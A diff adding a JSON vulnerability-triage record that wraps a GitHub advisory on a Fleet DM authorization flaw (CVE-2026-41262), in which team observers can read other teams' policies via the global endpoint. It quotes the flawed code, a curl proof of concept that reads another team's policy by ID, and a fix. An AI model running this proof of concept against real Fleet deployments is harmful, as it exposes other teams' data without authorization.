@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/114768995?v=4\", \"events_url\": \"https://api.github.com/users/offset/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/offset/followers\", \"following_url\": \"https://api.github.com/users/offset/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/offset/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/offset\", \"id\": 114768995, \"login\": \"offset\", \"node_id\": \"U_kgDOBtc8Yw\", \"organizations_url\": \"https://api.github.com/users/offset/orgs\", \"received_events_url\": \"https://api.github.com/users/offset/received_events\", \"repos_url\": \"https://api.github.com/users/offset/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/offset/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/offset/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/offset\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-41262\", \"cvss\": {\"score\": 4.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 4.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-863\", \"name\": \"Incorrect Authorization\"}], \"description\": \"## Summary\\n\\nThe global policy read endpoint (`GET /api/latest/fleet/policies/{policy_id}`) performs authorization against an empty `fleet.Policy{}` struct with nil TeamID, then fetches any policy by ID from the database without verifying the fetched policy actually belongs to the global scope. This allows a user with observer-level access on any single team to read the full details of policies belonging to any other team, bypassing Fleet's team isolation model.\\n\\n## Details\\n\\nThe vulnerability is in `GetPolicyByIDQueries` at `server/service/global_policies.go:163-180`:\\n\\n```go\\nfunc (svc Service) GetPolicyByIDQueries(ctx context.Context, policyID uint) (*fleet.Policy, error) {\\n\\t// Auth check uses empty Policy{} — TeamID is nil\\n\\tif err := svc.authz.Authorize(ctx, &fleet.Policy{}, fleet.ActionRead); err != nil {\\n\\t\\treturn nil, err\\n\\t}\\n\\n\\t// Fetches ANY policy by ID, regardless of team ownership\\n\\tpolicy, err := svc.ds.Policy(ctx, policyID)\\n\\tif err != nil {\\n\\t\\treturn nil, err\\n\\t}\\n\\t// ... populates install_software and run_script, returns full policy\\n\\treturn policy, nil\\n}\\n```\\n\\nThe authorization passes because the OPA rule at `server/authz/policy.rego:724-728` allows reading policies with null `team_id` for any user who holds a role on any team:\\n\\n```rego\\nallow {\\n  is_null(object.team_id)\\n  object.type == \\\"policy\\\"\\n  team_role(subject, subject.teams[_].id) == [admin, maintainer, technician, observer, observer_plus][_]\\n  action == read\\n}\\n```\\n\\nSince the auth object has nil TeamID, this rule fires for any team member. After authorization, `ds.Policy()` calls `policyDB()` at `server/datastore/mysql/policies.go:283-288` with a nil teamID:\\n\\n```go\\nfunc policyDB(ctx context.Context, q sqlx.QueryerContext, id uint, teamID *uint) (*fleet.Policy, error) {\\n\\tteamWhere := \\\"TRUE\\\"  // nil teamID → no team filter\\n\\targs := []interface{}{id}\\n\\tif teamID != nil {\\n\\t\\tteamWhere = \\\"team_id = ?\\\"\\n\\t\\targs = append(args, *teamID)\\n\\t}\\n\\t// ... executes SELECT with WHERE p.id = ? AND {teamWhere}\\n```\\n\\nThis returns any policy regardless of team ownership, and the full policy object is returned to the caller without any post-fetch team verification.\\n\\nBy contrast, the properly-secured endpoints verify team scope:\\n- `GetTeamPolicyByIDQueries` (`team_policies.go:421-428`) sets `TeamID: ptr.Uint(teamID)` on the auth object and calls `ds.TeamPolicy()` which filters by team\\n- `DeleteGlobalPolicies` (`global_policies.go:255-263`) explicitly checks `policy.PolicyData.TeamID != nil` after fetching\\n\\n## PoC\\n\\nPrerequisites: A Fleet instance with at least two teams. User A has observer role on Team 1 only. Team 2 has policies that User A should not be able to view.\\n\\n```bash\\n# Step 1: Authenticate as User A (Team 1 observer only)\\nTOKEN=$(curl -s -X POST https://fleet.example.com/api/latest/fleet/login \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"email\\\":\\\"team1observer@example.com\\\",\\\"password\\\":\\\"password\\\"}' | jq -r '.token')\\n\\n# Step 2: Enumerate policy IDs (they are sequential integers)\\n# Attempt to read a policy belonging to Team 2 (e.g., policy ID 5)\\ncurl -s -H \\\"Authorization: Bearer $TOKEN\\\" \\\\\\n  https://fleet.example.com/api/latest/fleet/policies/5\\n\\n# Expected: 403 Forbidden (user has no access to Team 2)\\n# Actual: 200 OK with full policy data:\\n# {\\n#   \\\"policy\\\": {\\n#     \\\"id\\\": 5,\\n#     \\\"name\\\": \\\"Team 2 Sensitive Policy\\\",\\n#     \\\"query\\\": \\\"SELECT * FROM sensitive_table WHERE ...\\\",\\n#     \\\"team_id\\\": 2,\\n#     \\\"passing_host_count\\\": 42,\\n#     \\\"failing_host_count\\\": 7,\\n#     \\\"description\\\": \\\"...\\\",\\n#     \\\"resolution\\\": \\\"...\\\",\\n#     ...\\n#   }\\n# }\\n```\\n\\n## Impact\\n\\nAn authenticated user with observer-level access on any single team can:\\n\\n- **Read SQL queries** from all team policies across the Fleet instance, potentially revealing security monitoring strategies, compliance checks, and internal infrastructure details\\n- **View host pass/fail counts** for other teams' policies, leaking compliance posture data across team boundaries\\n- **Access software installer and script metadata** associated with other teams' policies via the `populatePolicyInstallSoftware` and `populatePolicyRunScript` calls\\n- **Enumerate all policies** by iterating sequential integer IDs\\n\\nThis breaks Fleet's team isolation model, which is designed to restrict visibility between teams. Organizations using teams to separate departments, clients, or security zones would have their policy data exposed across boundaries.\\n\\n## Recommended Fix\\n\\nAdd a post-fetch check in `GetPolicyByIDQueries` to verify the returned policy is actually a global policy (nil TeamID), consistent with how `DeleteGlobalPolicies` operates:\\n\\n```go\\nfunc (svc Service) GetPolicyByIDQueries(ctx context.Context, policyID uint) (*fleet.Policy, error) {\\n\\tif err := svc.authz.Authorize(ctx, &fleet.Policy{}, fleet.ActionRead); err != nil {\\n\\t\\treturn nil, err\\n\\t}\\n\\n\\tpolicy, err := svc.ds.Policy(ctx, policyID)\\n\\tif err != nil {\\n\\t\\treturn nil, err\\n\\t}\\n\\n\\t// Verify this is actually a global policy — team policies must be\\n\\t// accessed via the team-scoped endpoint which enforces team authorization\\n\\tif policy.TeamID != nil {\\n\\t\\treturn nil, authz.ForbiddenWithInternal(\\n\\t\\t\\t\\\"attempting to read team policy via global endpoint\\\",\\n\\t\\t\\tauthz.UserFromContext(ctx),\\n\\t\\t\\tpolicy,\\n\\t\\t\\tfleet.ActionRead,\\n\\t\\t)\\n\\t}\\n\\n\\tif err := svc.populatePolicyInstallSoftware(ctx, policy); err != nil {\\n\\t\\treturn nil, ctxerr.Wrap(ctx, err, \\\"populate install_software\\\")\\n\\t}\\n\\tif err := svc.populatePolicyRunScript(ctx, policy); err != nil {\\n\\t\\treturn nil, ctxerr.Wrap(ctx, err, \\\"populate run_script\\\")\\n\\t}\\n\\n\\treturn policy, nil\\n}\\n```\\n\\nAlternatively, re-authorize against the actual fetched policy object so OPA rules properly evaluate team membership, similar to how other Fleet endpoints handle object-level authorization.\", \"ghsa_id\": \"GHSA-gm7f-v959-fr2g\", \"github_reviewed_at\": \"2026-06-26T20:30:27Z\", \"html_url\": \"https://github.com/advisories/GHSA-gm7f-v959-fr2g\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-gm7f-v959-fr2g\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-41262\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-26T20:30:27Z\", \"references\": [\"https://github.com/fleetdm/fleet/security/advisories/GHSA-gm7f-v959-fr2g\", \"https://github.com/advisories/GHSA-gm7f-v959-fr2g\"], \"repository_advisory_url\": \"https://api.github.com/repos/fleetdm/fleet/security-advisories/GHSA-gm7f-v959-fr2g\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/fleetdm/fleet\", \"summary\": \"Fleet DM Vulnerable to Cross-Team Policy Data Exposure via Global Policy Read Endpoint\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-26T20:30:29Z\", \"url\": \"https://api.github.com/advisories/GHSA-gm7f-v959-fr2g\", \"vulnerabilities\": [{\"first_patched_version\": \"4.85.0\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/fleetdm/fleet/v4\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 4.85.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-gm7f-v959-fr2g",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/fleetdm/fleet/v4: < 4.85.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-41262"
+    ],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/fleetdm/fleet/v4"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:57.064228Z",
+  "provenance": {
+    "content_sha256": "dc62684d04c55f7de1faae49e9e486e564f6daf37d0649c6b66bcd7b1575f92a",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-26T20:30:27Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-gm7f-v959-fr2g",
+  "status": "active",
+  "title": "Fleet DM Vulnerable to Cross-Team Policy Data Exposure via Global Policy Read Endpoint",
+  "updated_at": "2026-06-26T20:30:29Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-gm7f-v959-fr2g"
+}
